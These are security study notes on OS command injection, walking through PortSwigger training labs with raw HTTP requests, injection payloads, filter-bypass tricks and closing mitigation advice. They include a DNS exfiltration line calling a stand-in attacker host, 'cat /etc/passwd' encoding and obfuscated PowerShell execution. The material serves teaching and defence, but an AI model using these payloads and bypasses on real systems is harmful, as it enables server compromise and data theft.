# Command Injection

OS command injection allows an attacker to execute commands on the host (underlying server) operating system, and in some cases could result in the attacker assuming full control of the server. 

If the application doesn't implement any protections or user input validation, the attacker may be able to manipulate the underlying server command to execute arbitrary shell commands. 

## Simple injection

The basic example from PortSwigger is:

```
& echo aiwefwlguh &
```

??? example "PortSwigger OS Injection Lab 1: OS command injection, simple case"

	Here we've got an application that performs a stock lookup using a shell script on the underlying server. There are no user input protections in place. 
	
	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801072123.png)
	
	The request looks like this:
	
	```
	POST /product/stock HTTP/1.1
	Host: 0aab00a504ea896e81f0168900c60006.web-security-academy.net
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
	Accept: */*
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br, zstd
	Referer: https://0aab00a504ea896e81f0168900c60006.web-security-academy.net/product?productId=1
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 21
	Origin: https://0aab00a504ea896e81f0168900c60006.web-security-academy.net
	Connection: keep-alive
	Cookie: session=vvWuL2C5s8LQyofZUKKmcbiWpd2ntO4k
	Sec-Fetch-Dest: empty
	Sec-Fetch-Mode: cors
	Sec-Fetch-Site: same-origin
	X-PwnFox-Color: magenta
	Priority: u=0
	
	productId=1&storeId=1
	```
	
	```
	HTTP/1.1 200 OK
	Content-Type: text/plain; charset=utf-8
	X-Frame-Options: SAMEORIGIN
	Connection: close
	Content-Length: 3
	
	62
	```
	
	Testing each parameter individually, we get an error in the productId field:
	
	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801072647.png)
	
	The same payload works in the storeId field, however. 
	
	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801072745.png)
	
	The following script is what's getting executed
	
	```bash
	#!/bin/bash
	
	set -eu
	
	eval cksum <<< "$1 $2" | cut -c 2-3 | rev | sed s/0/1/
	```
	
	The input we provide is being expanded in `$2` and is passed to `eval`. 

## Useful Commands

These can be useful for getting more information about the operating system and environment.

=== "Linux"

	Name of the current user
	
	```bash
	whoami
	```
	
	Operating system
	
	```bash
	uname -a
	```
	
	Network configuration
	
	```bash
	ifconfig
	ip address show
	```
	
	Network connections
	
	```bash
	netstat -ano
	```
	
	Running processes
	
	```bash
	ps -ef
	```

=== "Windows"

	Name of the current user
	
	```powershell
	whoami
	```
	
	Operating system
	
	```powershell
	ver
	```
	
	Network configuration
	
	```powershell
	ipconfig /all
	```
	
	Network connections
	
	```powershell
	netstat -ano
	```
	
	Running processes
	
	```powershell
	tasklist
	```

## Blind OS Command Injection

If the application does not return the results of the command to the user, it's blind OS command injection vulnerability. 

### Detecting blind OS command injection

#### Time delay

Example:

```
& ping -c 10 127.0.0.1 &
```

This will generate a 10 second time delay. 

??? example "PortSwigger OS Command Injection Lab 2: Blind OS command injection with time delays"

	The application has a user feedback submission form.
	
	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801075848.png)
	
	After submitting feedback we just get a simple confirmation message
	
	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801075935.png)
	
	The submission POST request and response are below:
	
	```
	POST /feedback/submit HTTP/1.1
	Host: 0ac6008a0376a6c98350af40005d0069.web-security-academy.net
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
	Accept: */*
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br, zstd
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 110
	Origin: https://0ac6008a0376a6c98350af40005d0069.web-security-academy.net
	Connection: keep-alive
	Referer: https://0ac6008a0376a6c98350af40005d0069.web-security-academy.net/feedback
	Cookie: session=8mtcQ6OZfUVHqePZkLJJFthKWrV0R6QQ
	Sec-Fetch-Dest: empty
	Sec-Fetch-Mode: cors
	Sec-Fetch-Site: same-origin
	X-PwnFox-Color: magenta
	Priority: u=0
	
	csrf=tOw3LbawuI4HrrZRySXz0mv0uLBlRa4X&name=tester&email=tester%40test.com&subject=Testing&message=Test+message
	```
	
	```
	HTTP/1.1 200 OK
	Content-Type: application/json; charset=utf-8
	X-Frame-Options: SAMEORIGIN
	Connection: close
	Content-Length: 2
	
	{}
	```
	
	When we add a time delay payload in the email field, we get a (roughly) 10 second delay.
	
	```
	POST /feedback/submit HTTP/1.1
	Host: 0ac6008a0376a6c98350af40005d0069.web-security-academy.net
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
	Accept: */*
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br, zstd
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 110
	Origin: https://0ac6008a0376a6c98350af40005d0069.web-security-academy.net
	Connection: keep-alive
	Referer: https://0ac6008a0376a6c98350af40005d0069.web-security-academy.net/feedback
	Cookie: session=8mtcQ6OZfUVHqePZkLJJFthKWrV0R6QQ
	Sec-Fetch-Dest: empty
	Sec-Fetch-Mode: cors
	Sec-Fetch-Site: same-origin
	X-PwnFox-Color: magenta
	Priority: u=0
	
	csrf=tOw3LbawuI4HrrZRySXz0mv0uLBlRa4X&name=tester&email=tester%40test.com%26ping%20-c%2010%20127.0.0.1%20%26&subject=Testing&message=Test+message%26ping%20-c%2010%20127.0.0.1%20%26
	```
	
	```
	HTTP/1.1 500 Internal Server Error
	Content-Type: application/json; charset=utf-8
	X-Frame-Options: SAMEORIGIN
	Connection: close
	Content-Length: 16
	
	"Could not save"
	```
	
	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801080537.png)
	
	And the lab is done. 
	
	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801080637.png)
	

#### Redirecting output

If you know the web root, try redirecting the output of a command to a file in the web root that you can access in the browser.

The example given on PortSwigger is 

```
& whoami > /var/www/static/whoami.txt &
```

??? example "PortSwigger OS Command Injection Lab 3: Blind OS command injection with output redirection"

	This lab has a writable folder at `/var/www/images/`.
	
	The following request shows submitting user feedback.
	
	```
	POST /feedback/submit HTTP/1.1
	Host: 0a9b0076038b818e80098ad000df00bf.web-security-academy.net
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
	Accept: */*
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br, zstd
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 107
	Origin: https://0a9b0076038b818e80098ad000df00bf.web-security-academy.net
	Connection: keep-alive
	Referer: https://0a9b0076038b818e80098ad000df00bf.web-security-academy.net/feedback
	Cookie: session=WJSRirprxjalGTY0Rt4cRJjhcI1Yeeaf
	Sec-Fetch-Dest: empty
	Sec-Fetch-Mode: cors
	Sec-Fetch-Site: same-origin
	X-PwnFox-Color: magenta
	Priority: u=0
	
	csrf=SNExcmSFEI5HlhrXBK2GsamVMqSLoxbC&name=Tester&email=tester%40test.com&subject=Test&message=Test+message
	```
	
	```
	HTTP/1.1 200 OK
	Content-Type: application/json; charset=utf-8
	X-Frame-Options: SAMEORIGIN
	Connection: close
	Content-Length: 2
	
	{}
	```
	
	Sending a modified request as shown below results in an error:
	
	```
	POST /feedback/submit HTTP/1.1
	Host: 0a9b0076038b818e80098ad000df00bf.web-security-academy.net
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
	Accept: */*
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br, zstd
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 107
	Origin: https://0a9b0076038b818e80098ad000df00bf.web-security-academy.net
	Connection: keep-alive
	Referer: https://0a9b0076038b818e80098ad000df00bf.web-security-academy.net/feedback
	Cookie: session=WJSRirprxjalGTY0Rt4cRJjhcI1Yeeaf
	Sec-Fetch-Dest: empty
	Sec-Fetch-Mode: cors
	Sec-Fetch-Site: same-origin
	X-PwnFox-Color: magenta
	Priority: u=0
	
	csrf=SNExcmSFEI5HlhrXBK2GsamVMqSLoxbC&name=Tester&email=tester%40test.com%26%20whoami%20%3E%20%2Fvar%2Fwww%2Fimages%2Foutput.txt%26&subject=Test&message=Test+message
	```
	
	```
	HTTP/1.1 500 Internal Server Error
	Content-Type: application/json; charset=utf-8
	X-Frame-Options: SAMEORIGIN
	Connection: close
	Content-Length: 16
	
	"Could not save"
	```
	
	Despite the error, it is still possible to access the file to solve the lab.
	
	```
	GET /image?filename=output.txt HTTP/1.1
	Host: 0a9b0076038b818e80098ad000df00bf.web-security-academy.net
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br, zstd
	Connection: keep-alive
	Cookie: session=WJSRirprxjalGTY0Rt4cRJjhcI1Yeeaf
	Upgrade-Insecure-Requests: 1
	Sec-Fetch-Dest: document
	Sec-Fetch-Mode: navigate
	Sec-Fetch-Site: none
	Sec-Fetch-User: ?1
	X-PwnFox-Color: magenta
	Priority: u=0, i
	
	
	```
	
	```
	HTTP/1.1 200 OK
	Content-Type: text/plain; charset=utf-8
	X-Frame-Options: SAMEORIGIN
	Connection: close
	Content-Length: 13
	
	peter-5bn1PO
	
	```
	
	Done!
	
	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801085732.png)


#### Out-of-band techniques

##### DNS lookup

In some cases, we might be able to trigger a network (DNS) lookup and/or outbound HTTP requests to an attacker-controlled server using something like

```
& nslookup kgji2ohoyw.web-attacker.com &
```

??? example "PortSwigger OS Command Injection Lab 4: Blind OS command injection with out-of-band interaction"

	This lab also has a user feedback submission form.
	
	```
	POST /feedback/submit HTTP/1.1
	Host: 0a39006204d02b9e8091e49a0097000a.web-security-academy.net
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
	Accept: */*
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br, zstd
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 110
	Origin: https://0a39006204d02b9e8091e49a0097000a.web-security-academy.net
	Connection: keep-alive
	Referer: https://0a39006204d02b9e8091e49a0097000a.web-security-academy.net/feedback
	Cookie: session=1McxLb2lWaNaBFGd9uyodxWSUupAnm83
	Sec-Fetch-Dest: empty
	Sec-Fetch-Mode: cors
	Sec-Fetch-Site: same-origin
	X-PwnFox-Color: magenta
	Priority: u=0
	
	csrf=xNsEm8VcnAybNoHTgWTJY7MqFygRJRi8&name=Tester&email=tester%40test.com&subject=Testing&message=test+message
	```
	
	```
	HTTP/1.1 200 OK
	Content-Type: application/json; charset=utf-8
	X-Frame-Options: SAMEORIGIN
	Connection: close
	Content-Length: 2
	
	{}
	```
	
	I'm sending the following payload in the email field
	
	```
	&nslookup https://gbm3awvusa4mhpmkcwqf4pe2rpnsbaz3v.oast.site&
	```
	
	Sending the following request results in a hit to collaborator:
	
	```
	POST /feedback/submit HTTP/2
	Host: 0a39006204d02b9e8091e49a0097000a.web-security-academy.net
	Cookie: session=1McxLb2lWaNaBFGd9uyodxWSUupAnm83
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
	Accept: */*
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 166
	Origin: https://0a39006204d02b9e8091e49a0097000a.web-security-academy.net
	Referer: https://0a39006204d02b9e8091e49a0097000a.web-security-academy.net/feedback
	Sec-Fetch-Dest: empty
	Sec-Fetch-Mode: cors
	Sec-Fetch-Site: same-origin
	X-Pwnfox-Color: magenta
	Priority: u=0
	Te: trailers
	
	csrf=xNsEm8VcnAybNoHTgWTJY7MqFygRJRi8&name=Tester&email=tester%40test.com%26nslookup+3pttdo9rho8ap0mjzkx76iv8yz4qsgg5.oastify.com%26&subject=Test&message=test+message
	```
	
	```
	HTTP/2 200 OK
	Content-Type: application/json; charset=utf-8
	X-Frame-Options: SAMEORIGIN
	Content-Length: 2
	
	{}
	```
	
	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801092618.png)
	
	And that solves the lab

##### Exfiltrate data

It may be possible to extract data with out-of-band interaction. An example is below:

```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

??? example "PortSwigger OS Command Injection Lab 5: Blind OS command injection with out-of-band data exfiltration"

	This lab has a user feedback submission form. 
	
	```
	POST /feedback/submit HTTP/2
	Host: 0ab200d703b4c1df84bfd1a200c0009d.web-security-academy.net
	Cookie: session=ipo87j6SKo7fXskaWXQme9mDas4wz3wF
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
	Accept: */*
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 107
	Origin: https://0ab200d703b4c1df84bfd1a200c0009d.web-security-academy.net
	Referer: https://0ab200d703b4c1df84bfd1a200c0009d.web-security-academy.net/feedback
	Sec-Fetch-Dest: empty
	Sec-Fetch-Mode: cors
	Sec-Fetch-Site: same-origin
	X-Pwnfox-Color: magenta
	Priority: u=0
	Te: trailers
	
	csrf=fUs7WBQ50Gax7PgQXx4dVbDcyQiBbsBA&name=Tester&email=tester%40test.com&subject=Test&message=Test+message
	```
	
	```
	HTTP/2 200 OK
	Content-Type: application/json; charset=utf-8
	X-Frame-Options: SAMEORIGIN
	Content-Length: 2
	
	{}
	```
	
	I'm sending the following payload in the email field:
	
	```
	&nslookup `whoami`.r0shockfscjy0ox7a88vh66w9nfe35ru.oastify.com&
	```
	
	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801093406.png)
	
	After sending this request, we get a connection to collaborator showing the username as a subdomain:
	
	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801093716.png)
	
	After submitting that value to the lab we get the completion banner.
	
	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801093834.png)
	


## Injection Methods

Some shell characters function as command separators, including:

```
&
&&
|
||
```

### Injection operators

| **Operator** | **Character** | **URL-encoded character** |       **Executed Command**        |
| :----------: | :-----------: | :-----------------------: | :-------------------------------: |
|  Semicolon   |      `;`      |           `%3b`           |               Both                |
|   New Line   |     `\n`      |           `%0a`           |               Both                |
|  Background  |      `&`      |           `%26`           | Both (Second likely shown first)  |
|     Pipe     |      \|       |           `%7c`           |    Both (Only second is shown)    |
|     AND      |     `&&`      |         `%26%26`          | Both (only if the first succeeds) |
|      OR      |     \|\|      |         `%7c%7c`          | Second only (only if first fails) |

The following work on *nix only

```
;
0x0a
\n
```

On Unix-based systems we can also use `$()` and backticks '``' to execute inline commands.

### Filtered character bypass

=== "Linux" 

	Get all environment variables
	
	```bash
	printenv
	```
	
	**Spaces are filtered**
	Use tabs instead of spaces
	
	```
	%09
	```
	
	Replace this for spaces/tabs
	
	```
	${IFS}
	```
	
	Bracket expansion - the comma will be replaced with a space
	
	```
	{ls,-la}
	```
	
	**Other characters are filtered**
	This will be replaced with '/'
	
	```
	${PATH:0:1}
	```
	
	Will be replaced with ';'
	
	```
	${LS_COLORS:10:1}
	```
	
	Shift characters by one
	
	```
	$(tr '!-}' '"-~'<<<[)
	```

=== "Windows"

	Get all environment variables
	
	```powershell
	Get-ChildItem Env:
	```
	
	**Spaces are filtered**
	
	Use tabs instead of spaces
	
	```
	%09
	```
	
	Will be replaced by a space
	
	```
	# cmd
	%PROGRAMFILES:~10,-5%
	
	# powershell
	$env:PROGRAMFILES[10]
	```
	
	**Other characters are filtered**
	
	Will be replaced with '\\'
	
	```
	# cmd
	%HOMEPATH:~0,-17%
	
	# powershell
	$env:HOMEPATH[0]
	```

### Blacklisted command bypass

=== "Linux"

	**Character insertion**
	
	Total of '`' and/or '"' must be even
	
	```
	' or "
	```
	
	Linux only
	
	```
	$@ or \
	```
	
	**Case Manipulation**
	
	```
	$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
	```
	
	Execute reversed commands
	
	```
	$(rev<<<'imaohw')
	```
	
	**Encoded Commands**
	
	Encode a string with base64
	
	```
	echo -n 'cat /etc/passwd | grep 33' | base64
	```
	
	Execute reversed command
	
	```
	bash<<<$(base64 -d<<
	```

=== "Windows"

	**Character insertion**
	
	Windows only
	
	```
	^
	```
	
	**Case Manipulation**
	
	Just send weird casing
	
	```
	WhoAmi
	```
	
	**Reversed Commands**
	
	```powershell
	"whoami"[-1..-20] -join ''
	```
	
	Execute reversed commands
	
	```powershell
	iex "$('imaohw'[-1..-20] -join '')"
	```
	
	**Encoded Commands**
	
	Base64 encode a command
	
	```powershell
	[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
	```
	
	Execute the encoded command
	
	```powershell
	iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
	```

## Preventing OS Command Injection

Several measures can be taken to mitigate the risk of OS Command Injection, including:

- Do not call out directly to OS commands from application-level code. Use safer platform APIs. 
- Apply strong input validation if the application needs to accept user input
	- Use whitelists
	- Validate input on the server side, not just on the client side.
	- Don't rely on simply escaping shell metacharacters.
- Use the web server's built-in Web Application Firewall (e.g., in Apache	`mod_security`), in addition to an external WAF (e.g.	`Cloudflare`,	`Fortinet`,	`Imperva`..)
    
- Abide by the	[Principle of Least Privilege (PoLP)](https://en.wikipedia.org/wiki/Principle_of_least_privilege)	by running the web server as a low privileged user (e.g.	`www-data`)
    
- Prevent certain functions from being executed by the web server (e.g., in PHP	`disable_functions=system,...`)
    
- Limit the scope accessible by the web application to its folder (e.g. in PHP	`open_basedir = '/var/www/html'`)
    
- Reject double-encoded requests and non-ASCII characters in URLs
    
- Avoid the use of sensitive/outdated libraries and modules (e.g.	[PHP CGI](https://www.php.net/manual/en/install.unix.commandline.php))